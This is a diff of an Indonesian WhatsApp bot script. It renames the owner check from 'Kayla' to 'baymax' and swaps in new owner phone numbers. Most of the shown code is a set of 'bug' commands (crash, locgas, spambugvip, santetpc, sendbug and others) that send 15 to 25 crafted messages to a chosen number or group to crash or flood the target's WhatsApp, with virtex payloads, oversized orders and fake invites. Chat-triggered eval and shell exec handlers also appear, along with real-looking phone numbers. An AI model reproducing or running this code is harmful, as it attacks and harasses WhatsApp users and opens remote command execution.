‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n══✪〘 *👥 Tag All* 〙✪══\n`
@@ -1844,7 +1838,7 @@ let search = await yts(text)
 url = search.videos[0].url
 let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
 eek = await getBuffer(anu.thumbnail)
-owned = '6287705048235@s.whatsapp.net'
+owned = '6281390368580@s.whatsapp.net'
 ngen = `
 Title : ${anu.title}
 Ext : Search
@@ -2065,8 +2059,8 @@ baymax.sendMessage(creator,{text:`*❏ ORDER ❏*
 }
 break
 case 'addprem':
-if (!itsMeKayla) return reply(mess.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6287705048235`)
+if (!itsMebaymax) return reply(mess.owner)
+if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281390368580`)
 prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
 let ceknya = await baymax.onWhatsApp(prrkek)
 if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
@@ -2075,8 +2069,8 @@ fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
 reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
 break
 case 'delprem':
-if (!itsMeKayla) return reply(mess.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6287705048235`)
+if (!itsMebaymax) return reply(mess.owner)
+if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281390368580`)
 ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
 unp = prem.indexOf(ya)
 prem.splice(unp, 1)
@@ -2084,7 +2078,7 @@ fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
 reply(`Nomor ${ya} Telah Di Hapus Premium!`)
 break
 case 'addvn':{
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (args.length < 1) return reply('Nama audionya apa')
 if (vnnye.includes(q)) return reply("Nama tersebut sudah di gunakan")
 let delb = await baymax.downloadAndSaveMediaMessage(quoted)
@@ -2096,7 +2090,7 @@ reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
 }
 break
 case 'delvn':{
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (args.length < 1) return reply('Masukan query')
 if (!vnnye.includes(q)) return reply("Nama tersebut tidak ada di dalam data base")
 let wanu = vnnye.indexOf(q)
@@ -2116,8 +2110,8 @@ reply(teks)
 }
 break
 case 'addowner':
-if (!itsMeKayla) return reply(mess.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6287705048235`)
+if (!itsMebaymax) return reply(mess.owner)
+if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281390368580`)
 bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
 let ceknye = await baymax.onWhatsApp(bnnd + `@s.whatsapp.net`)
 if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
@@ -2126,8 +2120,8 @@ fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
 reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
 break
 case 'delowner':
-if (!itsMeKayla) return reply(mess.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6287705048235`)
+if (!itsMebaymax) return reply(mess.owner)
+if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281390368580`)
 ya = q.split("|")[0].replace(/[^0-9]/g, '')
 unp = owner.indexOf(ya)
 owner.splice(unp, 1)
@@ -2143,7 +2137,7 @@ teks += `\n*Total : ${prem.length}*`
 baymax.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
 break
 case 'setppbot': {
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
 if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
 if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
@@ -2199,7 +2193,7 @@ listType: 1
 const sendMsge = await baymax.sendMessage(from, listMessageNya)
 break
 case 'addlist':
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (!m.isGroup) return reply(mess.group)
 var args1 = text.split("@")[0]
 var args2 = text.split("@")[1]    
@@ -2217,7 +2211,7 @@ reply(`Sukses Add List Dengan Kunci : *${args1}*`)
 }
 break
 case 'dellist':
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (!m.isGroup) return reply(mess.group)
 if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
 if (!q) return reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item*\n\n_Contoh_\n\n${command.slice(1)} namalist`)
@@ -2226,7 +2220,7 @@ delResponList(from, q, db_respon_list)
 reply(`Sukses delete list message dengan key *${q}*`)
 break
 case 'updatelist':
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (!m.isGroup) return reply(mess.group)
 var args1 = q.split("@")[0]
 var args2 = q.split("@")[1]
@@ -2530,7 +2524,7 @@ reply(util.format(res))
 }
 break
 case 'vote': {
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "pollCreationMessage": {
 "name": "HALO SAYA baymax BOT",
@@ -2570,8 +2564,8 @@ reply(`Sukses Send Bug Ke Nomor ${q} Sebanyak ${jumlah}`)
 }
 break
 case 'crash':{
-if (!itsMeKayla) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6287705048235`)
+if (!itsMebaymax) return reply(mess.owner)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281390368580`)
 jumlah = '15'
 for (let i = 0; i < jumlah; i++) {
 baymax.sendMessage(`${q}`.split("-").join("").split(" ").join("").replace("+", "")+"@s.whatsapp.net", {sticker: ppnyauser},{quoted: {
@@ -2602,8 +2596,8 @@ reply(`Sukses Send Bug Ke Nomor ${q} Sebanyak ${jumlah}`)
 }
 break
 case 'jagoan' : {
-if (!itsMeKayla) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6287705048235`)
+if (!itsMebaymax) return reply(mess.owner)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281390368580`)
 baymax.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { 
 requestPaymentMessage: { 
 Message: { 
@@ -2629,7 +2623,7 @@ await sleep(1000)
 }
 break
 case 'jagoanneon' : {
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 baymax.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.chat, { 
 requestPaymentMessage: { 
 Message: { 
@@ -2655,7 +2649,7 @@ await sleep(1000)
 }
 break
 case 'locgas':{
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
@@ -2680,7 +2674,7 @@ reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
 case 'teksgas':{
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
@@ -2701,7 +2695,7 @@ reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
 case 'vngas':{
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
@@ -2713,7 +2707,7 @@ reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
 case 'kongas':{
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
@@ -2725,7 +2719,7 @@ reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
 case 'docgas':{
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
@@ -2743,7 +2737,7 @@ reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
 case 'stickgas':{
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
@@ -2755,7 +2749,7 @@ reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
 case 'itemgas': {
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
@@ -2767,7 +2761,7 @@ reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
 case 'cataloggas': {
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
@@ -2786,9 +2780,9 @@ var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
 "firstImageId": 1,
 "salePriceAmount1000": "1000",
 "retailerId": `Nomor Owner Di Atas`,
-"url": `https://wa.me/6287705048235`
+"url": `https://wa.me/6281390368580`
 },
-"businessOwnerJid": "6287705048235@s.whatsapp.net",
+"businessOwnerJid": "6281390368580@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: lep  })
 baymax.relayMessage(num, catalog.message, { messageId: catalog.key.id })
@@ -2798,7 +2792,7 @@ reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
 case 'kaylog':{
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: baymax.waUploadToServer })
@@ -2815,9 +2809,9 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "firstImageId": 1,
 "salePriceAmount1000": "1000",
 "retailerId": `Nomor Owner Di Atas`,
-"url": `https://wa.me/6287705048235`
+"url": `https://wa.me/6281390368580`
 },
-"businessOwnerJid": "6287705048235@s.whatsapp.net",
+"businessOwnerJid": "6281390368580@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: lep  })
 baymax.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
@@ -2827,7 +2821,7 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 case 'kayloc':{
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: baymax.waUploadToServer })
@@ -2850,7 +2844,7 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 case 'kaykontak':{
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
 baymax.sendContact(m.chat, owner, lep)
@@ -2860,7 +2854,7 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 case 'kayitem':{
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
 sendBugcrash(m.chat, `baymax Bot ${virus}${virtex(prefix)}`, `baymax Bot ${virus}${virtex(prefix)}`, `baymax Bot ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
@@ -2870,7 +2864,7 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 case 'kaystick':{
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
 baymax.sendMessage(m.chat, {sticker: ppnyauser},{ quoted: lep })
@@ -2879,7 +2873,7 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 case 'kaydoc':{
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
 baymax.sendMessage(m.chat, { 
@@ -2895,7 +2889,7 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 case 'kayvn':{
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
 baymax.sendMessage(m.chat, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
@@ -2905,7 +2899,7 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 case 'kayteks':{
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
 baymax.relayMessage(m.chat, {
@@ -2924,7 +2918,7 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 case 'santedparah': 
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (!q) return reply(`Contoh ${command} 6281297970769`)
 nmn = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
 if (Input == creator) return reply('Tidak Bisa, Karena Itu Nomer Developer')
@@ -2933,7 +2927,7 @@ if (hdhe.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di W
 santed(bygbt, nmn, sender)
 break
 case 'santetpc':
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (!q) return reply(`Contoh ${command} 6281297970769`)
 tosend = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
 if (Input == creator) return reply('Tidak Bisa, Karena Itu Nomer Developer')
@@ -2956,7 +2950,7 @@ await sleep(1000)
 reply(`Sukses`)
 break
 case 'santetgc':
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (!q) return reply(`Contoh ${prefix+command} linkgc`)
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
 let resultny = args[0].split('https://chat.whatsapp.com/')[1]
@@ -2978,14 +2972,14 @@ await sleep(1000)
 reply(`Sukses`)
 break
 case 'spambugvip':{
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (args.length < 1) return reply(`Penggunaan ${prefix+command} nomor|jumlah\nContoh ${prefix+command} 628362663622|5`)
 numt = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 jumlah = q.split('|')[1]
 let cekno = await baymax.onWhatsApp(numt)
 if (cekno.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
 if (isNaN(jumlah)) return reply(`Harus berupa angka`)
-var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6287705048235@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ppnyauser, caption: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
+var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6281390368580@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ppnyauser, caption: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
 var pollCreation = generateWAMessageFromContent(from,proto.Message.fromObject({pollCreationMessage: {name: 'HALO DEKK 🥶',options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'SALAM CREATOR BOT' }],selectableOptionsCount: 5,},}),{ userJid: from, quoted: lep })
 var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: baymax.waUploadToServer })
 var order = generateWAMessageFromContent(from,proto.Message.fromObject({ orderMessage: { orderId: '594071395007984',orderImage: messa.imageMessage,itemCount: 100000000000,status: 'INQUIRY',surface: 'CATALOG',message: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,jpegThumbnail: ppnyauser,orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,sellerJid: '628979185922@s.whatsapp.net',token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',totalAmount1000: '500000000000000',totalCurrencyCode: 'IDR',},}),{ userJid: from, quoted: lep })
@@ -3010,7 +3004,7 @@ baymax.sendMessage(numt, { text: '', templateButtons: [{ callButton: { displayTe
 }
 break
 case 'sendbug':{
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (!q) return reply(`Contoh ${prefix+command} linkgc`)
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
 let result = args[0].split('https://chat.whatsapp.com/')[1]
@@ -3033,7 +3027,7 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 case 'senddoc':{
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (!q) return reply(`Contoh ${prefix+command} linkgc`)
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
 let result = args[0].split('https://chat.whatsapp.com/')[1]
@@ -3052,7 +3046,7 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 case 'sendloc':{
-if (!itsMeKayla) return reply(mess.owner)
+if (!itsMebaymax) return reply(mess.owner)
 if (!q) return reply(`Contoh ${prefix+command} linkgc`)
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
 let result = args[0].split('https://chat.whatsapp.com/')[1]
@@ -3788,7 +3782,7 @@ reply(`⭔ _*Title :*_ ${xwpwifj.title}\n⭔ _*Author :*_ ${xwpwifj.author}\n⭔
 break
 case '>':
 case '=>':
-if (!itsMeKayla) return;
+if (!itsMebaymax) return;
 var err = new TypeError;
 err.name = "EvalError "
 err.message = "Code Not Found (404)"
@@ -3811,7 +3805,7 @@ reply(util.format(_syntax + _err))
 break
 default:
 if (budy.startsWith('<')) {
-if (!itsMeKayla) return
+if (!itsMebaymax) return
 try {
 return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
 } catch (e) {
@@ -3820,7 +3814,7 @@ reply(e)
 }
 
 if (budy.startsWith('vv')) {
-if (!itsMeKayla) return
+if (!itsMebaymax) return
 try {
 let evaled = await eval(budy.slice(2))
 if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
@@ -3831,7 +3825,7 @@ reply(String(err))
 }
 
 if (budy.startsWith('uu')){
-if (!itsMeKayla) return
+if (!itsMebaymax) return
 qur = budy.slice(2)
 exec(qur, (err, stdout) => {
 if (err) return reply(`${err}`)
@@ -3868,7 +3862,7 @@ baymax.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
 } catch (err) {
 console.log(util.format(err))
 let e = String(err)
